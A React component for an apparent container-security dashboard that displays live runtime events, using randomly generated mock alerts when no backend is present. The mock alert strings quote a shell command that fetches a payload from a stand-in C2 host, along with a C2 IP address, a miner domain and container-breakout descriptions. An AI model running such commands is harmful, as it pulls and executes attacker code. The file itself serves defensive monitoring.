import { useState, useEffect, useRef, useCallback } from "react";
import { invoke } from "@tauri-apps/api/core";

interface RuntimeEvent {
    id: string;
    timestamp: string;
    event_type: string;
    severity: string;
    container: string;
    image: string;
    description: string;
    pid: number;
}

const SEVERITY_COLORS: Record<string, string> = {
    CRITICAL: "#ff7b72",
    HIGH: "#ffa657",
    MEDIUM: "#d2a8ff",
    LOW: "#58a6ff",
};

const TYPE_ICONS: Record<string, string> = {
    PROCESS: "⚙️",
    NETWORK: "🌐",
    FILE: "📁",
    SYSCALL: "🔧",
};

export default function RuntimeDefensePanel() {
    const [events, setEvents] = useState<RuntimeEvent[]>([]);
    const [paused, setPaused] = useState(false);
    const [filter, setFilter] = useState<string | null>(null);
    const [totalCount, setTotalCount] = useState(0);
    const [eventsPerSec, setEventsPerSec] = useState(0);
    const tableRef = useRef<HTMLDivElement>(null);
    const lastCountRef = useRef(0);

    const isTauri = typeof window !== "undefined" && "__TAURI_INTERNALS__" in window;

    const generateMockEvents = useCallback((): RuntimeEvent[] => {
        const types = ["PROCESS", "NETWORK", "FILE", "SYSCALL"];
        const severities = ["CRITICAL", "HIGH", "MEDIUM", "LOW"];
        const containers = ["frontend-web-7f8a", "api-gateway-3b2c", "auth-svc-9d1e", "worker-queue-4a5f"];
        const images = ["node:18-alpine", "nginx:1.25", "python:3.12-slim", "redis:7-alpine"];
        const descs: Record<string, string[]> = {
            PROCESS: [
                "Unexpected shell spawned: /bin/sh -c 'curl http://evil.c2.io/payload'",
                "Privilege escalation detected: setuid(0) by non-root",
                "Process 'npm install' executed outside build phase",
            ],
            NETWORK: [
                "Outbound connection to C2 IP 185.143.223.47:443",
                "DNS query to suspicious domain: crypto-miner-pool.xyz",
                "Data exfiltration: 14MB uploaded to external S3 bucket",
            ],
            FILE: [
                "Write to /etc/passwd detected from container process",
                "Modified /usr/lib/node_modules/.package-lock.json at runtime",
                "Temp file created in /tmp with executable permissions",
            ],
            SYSCALL: [
                "ptrace(PTRACE_ATTACH) intercepted — possible debugger injection",
                "mount() from unprivileged container — breakout attempt",
                "Unusual ioctl() pattern matching CVE-2024-1086 exploit chain",
            ],
        };

        const count = 2 + Math.floor(Math.random() * 4);
        const out: RuntimeEvent[] = [];
        for (let i = 0; i < count; i++) {
            const t = types[Math.floor(Math.random() * types.length)];
            out.push({
                id: `evt-${Math.random().toString(16).slice(2, 10)}`,
                timestamp: new Date().toISOString().split("T")[1].slice(0, 12),
                event_type: t,
                severity: severities[Math.floor(Math.random() * severities.length)],
                container: containers[Math.floor(Math.random() * containers.length)],
                image: images[Math.floor(Math.random() * images.length)],
                description: descs[t][Math.floor(Math.random() * descs[t].length)],
                pid: 1000 + Math.floor(Math.random() * 64000),
            });
        }
        return out;
    }, []);

    useEffect(() => {
        if (paused) return;
        const interval = setInterval(async () => {
            try {
                let batch: RuntimeEvent[];
                if (isTauri) {
                    batch = await invoke<RuntimeEvent[]>("engine_poll_runtime_events");
                } else {
                    batch = generateMockEvents();
                }
                setEvents(prev => [...batch, ...prev].slice(0, 200));
                setTotalCount(prev => prev + batch.length);
            } catch (err) {
                console.error("Runtime poll failed", err);
            }
        }, 2000);
        return () => clearInterval(interval);
    }, [paused, isTauri, generateMockEvents]);

    // Calculate events/sec every 3s
    useEffect(() => {
        const interval = setInterval(() => {
            setEventsPerSec(Math.round((totalCount - lastCountRef.current) / 3));
            lastCountRef.current = totalCount;
        }, 3000);
        return () => clearInterval(interval);
    }, [totalCount]);

    const filtered = filter ? events.filter(e => e.event_type === filter) : events;

    const severityCounts = events.reduce((acc, e) => {
        acc[e.severity] = (acc[e.severity] || 0) + 1;
        return acc;
    }, {} as Record<string, number>);

    return (
        <div style={{ padding: "30px", maxWidth: "1400px", margin: "auto", color: "#c9d1d9", height: "100%", display: "flex", flexDirection: "column" }}>
            {/* Header */}
            <div style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", marginBottom: "20px" }}>
                <div>
                    <h2 style={{ margin: "0 0 5px 0", fontSize: "24px", color: "#58a6ff" }}>🐳 Runtime Container Defense</h2>
                    <p style={{ color: "#8b949e", margin: 0 }}>Live container security event feed — syscalls, processes, network, file integrity.</p>
                </div>
                <div style={{ display: "flex", gap: "10px", alignItems: "center" }}>
                    <div style={{ background: "#0d1117", border: "1px solid #30363d", borderRadius: "8px", padding: "10px 15px", textAlign: "center" }}>
                        <div style={{ fontSize: "20px", fontWeight: "bold", color: "#3fb950" }}>{eventsPerSec}</div>
                        <div style={{ fontSize: "10px", color: "#8b949e", textTransform: "uppercase" }}>events/sec</div>
                    </div>
                    <div style={{ background: "#0d1117", border: "1px solid #30363d", borderRadius: "8px", padding: "10px 15px", textAlign: "center" }}>
                        <div style={{ fontSize: "20px", fontWeight: "bold", color: "#e6edf3" }}>{totalCount}</div>
                        <div style={{ fontSize: "10px", color: "#8b949e", textTransform: "uppercase" }}>total events</div>
                    </div>
                    <button
                        onClick={() => setPaused(!paused)}
                        style={{ padding: "10px 18px", background: paused ? "#238636" : "#da3633", color: "white", border: "none", borderRadius: "6px", fontWeight: "bold", cursor: "pointer", fontSize: "13px" }}
                    >
                        {paused ? "▶ Resume" : "⏸ Pause"}
                    </button>
                </div>
            </div>

            {/* Severity Summary Bar */}
            <div style={{ display: "flex", gap: "10px", marginBottom: "15px" }}>
                {["CRITICAL", "HIGH", "MEDIUM", "LOW"].map(sev => (
                    <div key={sev} style={{ flex: 1, background: "#0d1117", border: `1px solid ${SEVERITY_COLORS[sev]}33`, borderRadius: "6px", padding: "10px", textAlign: "center" }}>
                        <div style={{ fontSize: "18px", fontWeight: "bold", color: SEVERITY_COLORS[sev] }}>{severityCounts[sev] || 0}</div>
                        <div style={{ fontSize: "10px", color: SEVERITY_COLORS[sev], textTransform: "uppercase", opacity: 0.7 }}>{sev}</div>
                    </div>
                ))}
            </div>

            {/* Filter Tabs */}
            <div style={{ display: "flex", gap: "8px", marginBottom: "15px" }}>
                <button onClick={() => setFilter(null)} style={{ padding: "6px 14px", background: filter === null ? "#1f6feb" : "#21262d", color: filter === null ? "white" : "#8b949e", border: "1px solid #30363d", borderRadius: "6px", cursor: "pointer", fontSize: "12px", fontWeight: "bold" }}>ALL</button>
                {Object.entries(TYPE_ICONS).map(([type, icon]) => (
                    <button key={type} onClick={() => setFilter(type)} style={{ padding: "6px 14px", background: filter === type ? "#1f6feb" : "#21262d", color: filter === type ? "white" : "#8b949e", border: "1px solid #30363d", borderRadius: "6px", cursor: "pointer", fontSize: "12px", fontWeight: "bold" }}>
                        {icon} {type}
                    </button>
                ))}
            </div>

            {/* Event Table */}
            <div ref={tableRef} style={{ flex: 1, overflowY: "auto", background: "#0d1117", border: "1px solid #30363d", borderRadius: "8px" }}>
                <table style={{ width: "100%", borderCollapse: "collapse", fontSize: "12px" }}>
                    <thead>
                        <tr style={{ background: "#161b22", position: "sticky", top: 0, zIndex: 1 }}>
                            {["Time", "Sev", "Type", "Container", "Image", "PID", "Description"].map(h => (
                                <th key={h} style={{ padding: "10px 12px", textAlign: "left", color: "#8b949e", fontWeight: "bold", borderBottom: "1px solid #30363d", fontSize: "11px", textTransform: "uppercase" }}>{h}</th>
                            ))}
                        </tr>
                    </thead>
                    <tbody>
                        {filtered.map((evt, idx) => (
                            <tr key={evt.id + idx} style={{ borderBottom: "1px solid #21262d", animation: idx === 0 && !paused ? "fadeIn 0.3s ease" : undefined }}>
                                <td style={{ padding: "8px 12px", fontFamily: "monospace", color: "#6e7681", whiteSpace: "nowrap" }}>{evt.timestamp}</td>
                                <td style={{ padding: "8px 12px" }}>
                                    <span style={{ color: SEVERITY_COLORS[evt.severity], fontWeight: "bold", fontSize: "11px", border: `1px solid ${SEVERITY_COLORS[evt.severity]}44`, padding: "2px 6px", borderRadius: "4px" }}>{evt.severity}</span>
                                </td>
                                <td style={{ padding: "8px 12px", color: "#e6edf3" }}>{TYPE_ICONS[evt.event_type]} {evt.event_type}</td>
                                <td style={{ padding: "8px 12px", color: "#58a6ff", fontFamily: "monospace" }}>{evt.container}</td>
                                <td style={{ padding: "8px 12px", color: "#8b949e", fontFamily: "monospace" }}>{evt.image}</td>
                                <td style={{ padding: "8px 12px", color: "#6e7681", fontFamily: "monospace" }}>{evt.pid}</td>
                                <td style={{ padding: "8px 12px", color: "#c9d1d9", maxWidth: "400px", overflow: "hidden", textOverflow: "ellipsis", whiteSpace: "nowrap" }}>{evt.description}</td>
                            </tr>
                        ))}
                    </tbody>
                </table>
            </div>

            <style>{`@keyframes fadeIn { from { opacity: 0; background: #1f6feb22; } to { opacity: 1; background: transparent; } }`}</style>
        </div>
    );
}
